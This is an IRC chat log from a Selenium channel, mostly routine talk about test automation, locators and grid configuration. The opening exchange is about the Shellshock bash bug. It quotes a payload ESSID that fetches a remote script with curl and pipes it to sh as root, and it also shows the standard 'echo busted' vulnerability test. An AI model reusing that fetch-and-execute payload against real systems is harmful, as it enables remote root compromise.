[2014-09-25 03:53:07] WhereIsMySpoon: Dave_B_: so you can just send arbitrary bash commands to cgi scripts?
[2014-09-25 03:55:35] WhereIsMySpoon: this is pretty crazy
[2014-09-25 03:55:43] WhereIsMySpoon: good thing we dont use cgi scripts :p
[2014-09-25 03:57:09] ato: 23:22:56 < argggh> Wonder how many systems you could root by setting your ESSID to "() { :; };curl td.gl/fnord|sh -" and drive around town with your AP.
[2014-09-25 03:58:15] WhereIsMySpoon: ato: what does that do?
[2014-09-25 03:58:23] ato: I wouldn't try it.
[2014-09-25 03:58:42] WhereIsMySpoon: sure, but what's it do
[2014-09-25 03:59:35] ato: dhclient's hook scripts set environmental variables which may be run in bash.  So that fetches a script from a remote and executes it with root permissions.
[2014-09-25 04:00:05] WhereIsMySpoon: what's this () { :; };

[2014-09-25 04:03:43] ato: It's the exploit.
[2014-09-25 04:04:09] ato: It escapes the current function that bash uses internally and lets you get into a context where you can issue new commands to the shell.
[2014-09-25 04:04:24] ato: Try running `env X="() { :;} ; echo busted" `which bash` -c "echo completed"` in your terminal.
[2014-09-25 04:06:45] WhereIsMySpoon: ato: I get "env: which sh: no such file or directory"
[2014-09-25 04:06:57] WhereIsMySpoon: tried with bash and sh, bash said the same so thought id try sh
[2014-09-25 04:07:18] WhereIsMySpoon: ah wait nvm i was using ' instead of `
[2014-09-25 04:07:54] WhereIsMySpoon: ato: ok so that prints out busted, then completed on a new line, but that doesnt really help me understand what just happened

[2014-09-25 04:11:32] Dave_B_: -bash: TERM_PROGRAM=Apple_Terminal: command not found
[2014-09-25 04:14:19] ato: WhereIsMySpoon: It set an environment variable in your shell which expands when set.  So when dhclient takes the ESSID and sets that to a variable in its hooks, you can potentially root the whole machine.

[2014-09-25 08:27:44] cable: oh... question, im trying to make a selenium based tester. it fills in 2 fiels and I need the "delete" button after that field
[2014-09-25 08:28:07] dimacus: you need to click on the "delete" button after you filled it out?
[2014-09-25 08:28:44] cable: yeah let me explain : "I create a user"  and now I want to delete specific user with name equals = " X ";
[2014-09-25 08:29:04] cable: and there multiple same buttons with delete on the page
[2014-09-25 08:29:26] dimacus: gotcha, it seems like you need to find the "delete" button based on context
[2014-09-25 08:29:44] dimacus: similar to how you would give someone directions "get to this gas station, once you get there take a right"
[2014-09-25 08:29:45] cable: yes, I was trying to see should I do it with a regex in jquery php or in the ide?
[2014-09-25 08:29:58] dimacus: what's the programing language you are using?
[2014-09-25 08:30:06] cable: Well im on laravel php atm.
[2014-09-25 08:30:15] dimacus: cool
[2014-09-25 08:30:28] cable: object oriented laravel combined with php
[2014-09-25 08:30:32] dimacus: is there a way to find the div or row that belongs to the user? shuch as
[2014-09-25 08:30:33] cable: uuuh selenium :p
[2014-09-25 08:30:55] dimacus: <div id="user-x">foo<button /></div>
[2014-09-25 08:31:20] sebhoss, joining. (#selenium)
[2014-09-25 08:31:45] cable: no its just <td>email</td><td>name</td><td>lastname</td><td>groups</td><td>edit</td><td>delete</td>
[2014-09-25 08:31:57] cable: every row is the same

[2014-09-25 08:32:22] *dimacus cringes'
[2014-09-25 08:32:24] cable: yeah so I was thinking a hardcoded regex based on jquery with a child
[2014-09-25 08:32:36] dimacus: you don't have to, it's still doable
[2014-09-25 08:32:41] dimacus: just need to use loops :(
[2014-09-25 08:32:51] dimacus: any other class names on any TDs or anything?
[2014-09-25 08:33:05] d0x, quitting. (Ping timeout: 260 seconds)
[2014-09-25 08:33:09] [1]JP: Guessing you'll have to do the equivalent of "take the second table on the left" if there's nothing to identify elements
[2014-09-25 08:33:30] dimacus: surely it can't be stright TDs without anything else identifying them, like css classes?
[2014-09-25 08:33:56] ato: td:nth-child(6) input
[2014-09-25 08:34:10] Dave_B_: just get the list all the user rows, then iterate over until you find one that matches the given name
[2014-09-25 08:34:15] Dave_B_: not elegant, but it'll work
[2014-09-25 08:34:28] cable: true last 2 edit and edit got actions
[2014-09-25 08:34:32] cable: as class identifier
[2014-09-25 08:35:53] cable: am thinking elegant solution should be something like "regex with username" get the child element 'actions' and the 2nd form.
[2014-09-25 08:36:12] dimacus: what's wrong with doing something like this?
[2014-09-25 08:36:17] dimacus: cable: here is some sudo code https://gist.github.com/dimacus/097a6c96953dae22ac13
[2014-09-25 08:36:22] lampd1, joining. (#selenium)
[2014-09-25 08:36:34] dimacus: no regex is never an elegant solution
[2014-09-25 08:36:53] dimacus: yes it's compact and fast, but 2 weeks from now when it breaks, it will take you a day to parse the regex
[2014-09-25 08:37:42] Dave_B_: yeah ^ that's what I was thinking of
[2014-09-25 08:38:05] dimacus: cable: you could do a seriously badass XPATH search, that will also be a 1 liner, but just like with REGEX, everyone who will read it will be super confused
[2014-09-25 08:38:06] cable: your right about that regex's tend to be hard to read
[2014-09-25 08:38:19] cable: Xpath I try to avoid
[2014-09-25 08:38:52] cable: Dang Dimacus good solution :)

[2014-09-25 08:56:35] cable: locally atm.

[2014-09-25 10:55:27] smccarthy: haha nice!
[2014-09-25 10:55:38] smccarthy: btw, do you think it would be a good feature to have the hub's config be in a json config file (for Selenium-Grid-Extras) ?
[2014-09-25 10:56:57] dimacus: absolutely
[2014-09-25 10:57:16] dimacus: i've been wanting to do that feature for a while, just had more important things keep coming up
[2014-09-25 10:57:35] dimacus: if we have hub config in json, that means we can launch multiple hubs, which is something people are asking for
[2014-09-25 10:57:50] smccarthy: oh true. Plus update any of the default features
[2014-09-25 10:57:55] dimacus: yeah
[2014-09-25 10:58:03] smccarthy: maybe easily add a custom compatibility matcher
[2014-09-25 10:58:06] dimacus: yeah
[2014-09-25 10:58:10] dimacus: that would be lovely
[2014-09-25 10:58:16] smccarthy: i can try making a branch for that feature.

[2014-09-25 11:00:10] testnoob: Hi. I needed some help with Selenium IDE. Specifically to verify an element is present. The issue i have with this is that I have a different image for different user groups. When I select the element for verification it only includes the img class as a parameter and not the src. If i run a test case for each user type (2) using the same element target one should pass and one should fail which is my goal.
[2014-09-25 11:01:04] smccarthy: yea, thats what i was thinking too
[2014-09-25 11:01:23] testnoob: however, both test cases pass because the img class is the same
[2014-09-25 11:01:58] testnoob: can IDE check for the src as well?
[2014-09-25 11:06:57] dimacus: testnoob: i don't remeber, but can you do a search in IDE by CSS class or Xpath?
[2014-09-25 11:07:16] dimacus: feels like you should be looking for an image with class "a" and attribute href of "b"

[2014-09-25 11:11:43] dimacus: testnoob: feels like you need to play with the browser console and find out how to properly build the search on the fly.
[2014-09-25 11:11:51] dimacus: is the site publically accesible?

[2014-09-25 11:19:37] testnoob: IDE only verifies that the element - img class="col-lg--offset-6 img-responsive - is present. Which is the same for both programs. just the img source differs
[2014-09-25 11:19:58] dimacus: ok let me see what i can do

[2014-09-25 11:23:52] dimacus: it's recomended to switch to a programing language as soon as you can

[2014-09-25 13:00:04] smccarthy:  with ?
[2014-09-25 13:00:36] dimacus: Hub contains the JSON configs for each node, Hub says Node 1 has Firefox & IE & Chrome
[2014-09-25 13:00:53] dimacus: when launching the node, the node self checks each of the browsers to get current version of each
[2014-09-25 13:01:18] smccarthy: yea ? sounds good so far
[2014-09-25 13:01:19] dimacus: if Firefox cannot be started because w/e, pull Firefox capbability out of the node?
[2014-09-25 13:01:30] dimacus: or keep it there and let the test fail?
[2014-09-25 13:01:40] smccarthy: yea that would probably be best. I think pull it out is best.
[2014-09-25 13:01:51] dimacus: example: Firefox auto updates but the webdriver did not
[2014-09-25 13:01:59] dimacus: so FF is too new
[2014-09-25 13:02:28] smccarthy: so if FF is too new, it wont be able to get the browser version ? Because you are going to open the browser to get the verison ?
[2014-09-25 13:02:50] dimacus: no if FF is too new, you won't be able to start it
[2014-09-25 13:03:14] dimacus: by explicitly pulling it out from the grid, we self protect the nodes from that situation

[2014-09-25 14:11:51] d0x: argh. I thought i can use it to exectue JS in chrome
[2014-09-25 14:13:49] jimevans: i'm quite sure that the bindings haven't kept up with the evolution of the marionette wire protocol. which, incidentally, stands to continue to change until the w3c spec is at least at last call.
[2014-09-25 14:14:01] jimevans: though ato or AutomatedTester can correct me here.

[2014-09-25 14:16:25] d0x: I talked to AutomatedTester some days ago. He suggested me to use it. Basically the idea was to add a Webdriver Command SET_CONTEXT (http://marionette-client.readthedocs.org/en/latest/#marionette.Marionette.set_context) and then use it to exectue stuff in the chrome context

[2014-09-25 14:17:31] jimevans: it doesn't change my opinion that it was supremely irresponsible to commit the marionette command executor when marionette is so far from its 1.0 release.

[2014-09-25 23:26:23] barancev: :note jleyba I have issues with org.openqa.selenium.ReferrerTest.crossDomainHistoryNavigationWithADirectProxy , it fails with strange test server exception: https://gist.github.com/barancev/d5169af0a402035aa171 , but if I run it in debugger step by step all is OK. there must be a race condition somewhere...
